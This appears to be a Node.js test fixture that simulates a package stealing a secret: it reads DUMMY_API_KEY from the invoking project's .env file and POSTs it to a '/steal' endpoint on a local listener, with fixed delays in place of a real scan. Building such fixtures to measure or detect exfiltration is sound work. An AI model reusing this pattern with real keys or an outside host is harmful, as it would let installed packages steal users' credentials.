// This fixture sends only the designated dummy value to the local listener.
const fs = require('node:fs');
const path = require('node:path');

// The measurement can choose a separate local port without disturbing other runs.
const port = process.env.MOCK_LISTENER_PORT || '4001';
if (!/^\d{1,5}$/.test(port) || Number(port) < 1 || Number(port) > 65535) {
  throw new Error('Invalid local listener port');
}

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

async function simulateLeak() {
  // These stages are fixed delays; no machine scan is performed.
  console.log('[simulation] Scanning target (simulated)...');
  await delay(1000);
  console.log('[simulation] Gathering dummy token...');
  await delay(1000);

  // INIT_CWD points to the project that invoked npm, not this package's folder.
  const envFile = path.join(process.env.INIT_CWD || process.cwd(), '.env');
  const match = fs.readFileSync(envFile, 'utf8').match(/^DUMMY_API_KEY=(.*)$/m);
  if (!match) {
    throw new Error('DUMMY_API_KEY missing from test .env');
  }

  console.log('[simulation] Sending dummy token to local listener...');
  const response = await fetch(`http://127.0.0.1:${port}/steal`, {
    method: 'POST',
    body: match[1].trim(),
  });
  if (!response.ok) {
    throw new Error(`Listener returned ${response.status}`);
  }
  console.log('[simulation] Dummy token received.');
}

simulateLeak().catch(error => {
  console.error(error);
  process.exitCode = 1;
});
